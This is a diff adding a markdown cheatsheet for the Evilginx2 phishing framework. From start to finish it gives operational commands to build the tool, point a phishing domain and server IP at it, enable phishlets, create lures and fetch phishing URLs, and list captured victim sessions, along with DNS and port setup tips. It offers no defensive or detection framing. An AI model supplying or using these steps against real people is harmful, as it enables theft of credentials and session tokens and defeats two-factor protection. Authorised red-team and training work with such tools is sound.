@@ -1,0 +1,63 @@
+## 🎣 Evilginx2 Cheatsheet {.cols-2}
+
+### ⚙️ Setup
+
+| Command                                               | Description                                 |
+| ----------------------------------------------------- | ------------------------------------------- |
+| `git clone https://github.com/kgretzky/evilginx2.git` | Clone Evilginx2 source code                 |
+| `cd evilginx2 && make && sudo make install`           | Build and install Evilginx2                 |
+| `evilginx -p ./phishlets -t ./templates`              | Start Evilginx2 with custom paths           |
+| `evilginx -developer`                                 | Run in developer mode with self-signed cert |
+| `evilginx -debug`                                     | Enable debug output                         |
+
+### 🌐 Domain Configuration
+
+| Command                        | Description                  |
+| ------------------------------ | ---------------------------- |
+| `config domain yourdomain.com` | Set phishing domain          |
+| `config ip <your_server_ip>`   | Set server public IP address |
+
+### 🎭 Phishlet Management
+
+| Command                                                | Description                        |
+| ------------------------------------------------------ | ---------------------------------- |
+| `phishlets`                                            | List available phishlets           |
+| `phishlets enable <name>`                              | Enable a specific phishlet         |
+| `phishlets disable <name>`                             | Disable a specific phishlet        |
+| `phishlets hostname <name> <subdomain.yourdomain.com>` | Assign hostname to phishlet        |
+| `phishlets hide <name>`                                | Hide a phishlet from lure creation |
+| `phishlets unhide <name>`                              | Unhide a phishlet                  |
+
+### 🪤 Lure Management
+
+| Command                                   | Description                  |
+| ----------------------------------------- | ---------------------------- |
+| `lures create <phishlet_name>`            | Create a new lure            |
+| `lures edit <lure_id> redirect_url <url>` | Set redirect URL after login |
+| `lures get-url <lure_id>`                 | Show phishing URL            |
+| `lures delete <lure_id>`                  | Delete a lure                |
+| `lures list`                              | List all configured lures    |
+
+### 🕵️ Session Monitoring
+
+| Command         | Description                        |
+| --------------- | ---------------------------------- |
+| `sessions`      | List all captured sessions         |
+| `sessions <id>` | View details of a specific session |
+
+### 🧪 Testing & Output {.row-span-2}
+
+| Command                                  | Description                    |
+| ---------------------------------------- | ------------------------------ |
+| `evilginx -p ./phishlets -t ./templates` | Use custom directories         |
+| `evilginx -debug`                        | Show debug logs                |
+| `evilginx -q`                            | Run quietly (no banner/output) |
+
+---
+
+✅ **Tip:** Use DNS A records for subdomains and CNAMEs for wildcard phishing domains. Disable other services using ports 80, 443, and 53.
+
+### 🔗 Resources
+
+- [Evilginx2 GitHub](https://github.com/kgretzky/evilginx2)
+- [Documentation](https://breakdev.org/evilginx-2-next-generation-of-phishing-2fa-tokens/)
